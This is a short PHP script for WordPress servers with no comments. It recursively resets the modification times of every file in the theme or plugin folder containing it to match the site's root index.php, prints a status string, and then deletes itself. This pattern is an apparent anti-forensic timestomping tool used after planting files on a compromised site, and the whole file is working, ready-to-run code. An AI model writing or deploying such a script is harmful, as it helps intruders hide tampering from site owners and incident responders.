<?php

function updateFileDates($dir, $timestamp) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        
        $path = $dir . '/' . $item;
        touch($path, $timestamp);
        
        if (is_dir($path)) {
            updateFileDates($path, $timestamp);
        }
    }
}

function extractFirstPathSegment($path) {
    $path = trim(str_replace(str_replace('\\', '/', $_SERVER["DOCUMENT_ROOT"]), '', $path));
    $path = str_replace("/wp-content/themes/", "", $path);
    $path = str_replace("/wp-content/plugins/", "", $path);

    $folders = explode('/', $path);
    return !empty($folders[0]) ? $folders[0] : '';
}

function getPathFolder($file_path) {
    $folderName = extractFirstPathSegment($file_path);
    if (!empty($folderName)) {
        $themePath = str_replace('\\', '/', $_SERVER["DOCUMENT_ROOT"]) . "/wp-content/themes/" . $folderName;
        if (is_dir($themePath)) {
            return $themePath;
        }
        
        $pluginPath = str_replace('\\', '/', $_SERVER["DOCUMENT_ROOT"]) . "/wp-content/plugins/" . $folderName;
        if (is_dir($pluginPath)) {
            return $pluginPath;
        }
    }
    return '';
}

$self_file = str_replace('\\', '/', __FILE__);
$index_root_path = str_replace('\\', '/', $_SERVER["DOCUMENT_ROOT"] . "/index.php");
$reference_timestamp = filemtime($index_root_path);
$directory = getPathFolder($self_file);

if (!empty($directory)) {
    touch($directory, $reference_timestamp);
    updateFileDates($directory, $reference_timestamp);
}

echo "STATUS|OK";
unlink(__FILE__);